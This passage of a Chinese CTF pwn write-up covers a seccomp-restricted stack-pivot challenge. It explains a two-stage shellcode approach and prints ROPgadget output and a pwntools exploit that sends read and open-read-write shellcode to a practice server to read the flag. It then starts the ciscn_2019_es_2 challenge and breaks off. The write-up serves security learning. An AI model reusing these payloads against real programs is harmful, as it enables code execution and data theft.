0009&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0006: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x02&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000001&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == write) goto 0009&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0007: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000002&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;) goto 0009&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0008: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000003c&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != exit) goto &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0009: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x7fff0000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;10: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; KILL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;p&gt;​		需要分两次利用,因为无法直接把payload写入0x123000,所以先构造一个读取的payload,读入第二阶段payload后,再跳转过去&lt;/p&gt;
&lt;p&gt;​		1.先利用第一次read读取第一阶段shellcode并跳转到这里进行执行,这串shellcode是读取第二阶段orw的shellcode到0x123000并跳转到那里&lt;/p&gt;
&lt;p&gt;​		具体而言,第一阶段payload &amp;#x3D; asm(read_shellcode).ljust(32,b”\x00”) + p64(0) +p64(jmp_rsp)+asm(‘sub rsp,0x30;jmp rsp’)&lt;/p&gt;
&lt;p&gt;​		jmp rsp相当于没干什么,只是跳到了下一条指令,但是如果没有这条指令,直接上汇编的话,识别不了,这里相当于给了一条指令的地址pop 出来的是指令的地址,jmp 过去的是可以直接执行的?&lt;/p&gt;
&lt;p&gt;​		ret的话,是pop rip,在返回地址处放上一条指令的地址才对,所以这里放了jmp_rsp,pop rip后rsp指向了 asm(‘sub rsp,0x30;jmp rsp’),jmp到这里才可以把这里的数据当成指令,然后正好可以继续执行指令&lt;/p&gt;
&lt;p&gt;​		大概..需要补汇编基础了…&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410140744974.png&#34; alt=&#34;image-20230410140744974&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;​		2. 第一阶段的payload是读取第二阶段payload(orw)到0x123000,然后跳转过去&lt;/p&gt;
&lt;h2 id=&#34;栈迁移&#34;&gt;&lt;a href=&#34;#栈迁移&#34; class=&#34;headerlink&#34; title=&#34;栈迁移&#34;&gt;&lt;/a&gt;栈迁移&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;-ubuntu:/home/ubuntu/stackpivot/jikenotbad&lt;span class=&#34;comment&#34;&gt;# ROPgadget --binary bad  --only &amp;#x27;jmp&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x000000000040078b&lt;/span&gt; : jmp &lt;span class=&#34;number&#34;&gt;0x400770&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00000000004008eb&lt;/span&gt; : jmp &lt;span class=&#34;number&#34;&gt;0x400880&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000400b03&lt;/span&gt; : jmp &lt;span class=&#34;number&#34;&gt;0x400b7a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000400b87&lt;/span&gt; : jmp qword ptr [rax - &lt;span class=&#34;number&#34;&gt;0x68000000&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000400ceb&lt;/span&gt; : jmp qword ptr [rbp]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000400865&lt;/span&gt; : jmp rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000400a01&lt;/span&gt; : jmp rsp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这里用到了jmp 这个转移的办法&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;exp一定要加上架构,不然报错,因为要进行汇编&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = remote(&amp;quot;xxx&amp;quot;,xxx)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node4.buuoj.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;29945&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = process(&amp;quot;./bad&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x000400A3E&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch= &lt;span class=&#34;string&#34;&gt;&amp;#x27;x86_64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vulnaddr = &lt;span class=&#34;number&#34;&gt;0x0400A1E&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bssaddr = &lt;span class=&#34;number&#34;&gt;0x006010Aa&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# mov rdi,buxingma3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;orw_shellcode = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rax,0x67616c662f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;push rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rdi,rsp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;xor rsi,rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rax,0x2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;syscall&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rdi,rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rsi,0x6010aa&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rdx,0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;xor rax,rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;syscall&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rdi,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rsi,0x6010aa&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rdx,0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rax,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;syscall&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;hlt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read_shellcode = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rdi,0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rsi,0x123000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;mov rdx,0x1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;xor rax,rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;syscall&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;jmp rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmp_rsp = &lt;span class=&#34;number&#34;&gt;0x00000400a01&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 这几个payload都可以,本质都一样&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = asm(read_shellcode).ljust(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(jmp_rsp) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xE8\xcb\xff\xff\xff&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload = asm(read_shellcode).ljust(32,b&amp;quot;\x00&amp;quot;) + p64(0) + p64(jmp_rsp)+asm(&amp;#x27;sub rsp,0x30;jmp rsp&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload = asm(read_shellcode).ljust(32,b&amp;quot;\x00&amp;quot;) + p64(0) + p64(jmp_rsp) + b&amp;#x27;\xE8\xcb\xff\xff\xff&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh.send(payload)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh.send(asm(orw_shellcode))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Easy shellcode, have fun!&amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Baddd! Focu5 me! Baddd! Baddd!&amp;#x27;&lt;/span&gt;,asm(orw_shellcode))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;知识点总结&#34;&gt;&lt;a href=&#34;#知识点总结&#34; class=&#34;headerlink&#34; title=&#34;知识点总结&#34;&gt;&lt;/a&gt;知识点总结&lt;/h1&gt;&lt;p&gt;orw的shellcode编写&lt;/p&gt;
&lt;h3 id=&#34;栈迁移-jmp-rsp-、及jmp-转移指令的含义&#34;&gt;&lt;a href=&#34;#栈迁移-jmp-rsp-、及jmp-转移指令的含义&#34; class=&#34;headerlink&#34; title=&#34;栈迁移 jmp rsp 、及jmp 转移指令的含义&#34;&gt;&lt;/a&gt;栈迁移 jmp rsp 、及jmp 转移指令的含义&lt;/h3&gt;&lt;p&gt;#payload &amp;#x3D; asm(read_shellcode).ljust(32,b”\x00”) + p64(0) + p64(jmp_rsp)+asm(‘sub rsp,0x30;jmp rsp’)&lt;/p&gt;
&lt;h3 id=&#34;近转移call的含义&#34;&gt;&lt;a href=&#34;#近转移call的含义&#34; class=&#34;headerlink&#34; title=&#34;近转移call的含义&#34;&gt;&lt;/a&gt;近转移call的含义&lt;/h3&gt;&lt;p&gt;payload &amp;#x3D; asm(read_shellcode).ljust(32,b”\x00”) + p64(0) + p64(jmp_rsp) + b’\xE8\xcb\xff\xff\xff’&lt;/p&gt;
&lt;p&gt;​	e8是 call的操作码 &lt;em&gt;#call 硬编码E8，后面加上四个字节的偏移(目标指令 - 下一条指令地址)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;hex(0xffffffcb - 0xffffffff) &amp;#x3D; - 0x34&lt;/p&gt;
&lt;p&gt;那7f不会影响它吗?&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410142020849.png&#34; alt=&#34;image-20230410142020849&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410143448769.png&#34; alt=&#34;image-20230410143448769&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;h2 id=&#34;疑问&#34;&gt;&lt;a href=&#34;#疑问&#34; class=&#34;headerlink&#34; title=&#34;疑问&#34;&gt;&lt;/a&gt;疑问&lt;/h2&gt;&lt;p&gt;下断点断不下来,直接跳到后面read之后了&lt;/p&gt;
&lt;p&gt;近转移call的含义&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_34010404/article/details/123809796&#34;&gt;https://blog.csdn.net/qq_34010404/article/details/123809796&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/mcmuyanga/article/details/113389703&#34;&gt;https://blog.csdn.net/mcmuyanga/article/details/113389703&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-ciscn-2019-es-2&#34;&gt;&lt;a href=&#34;#3-ciscn-2019-es-2&#34; class=&#34;headerlink&#34; title=&#34;3.ciscn_2019_es_2&#34;&gt;&lt;/a&gt;3.ciscn_2019_es_2&lt;/h1&gt;&lt;p&gt;Ubuntu 18   2.27 32位&lt;/p&gt;
&lt;h2 id=&#34;分析反编译代码及保护-1&#34;&gt;&lt;a href=&#34;#分析反编译代码及保护-1&#34; class=&#34;headerlink&#34; title=&#34;分析反编译代码及保护&#34;&gt;&lt;/a&gt;分析反编译代码及保护&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 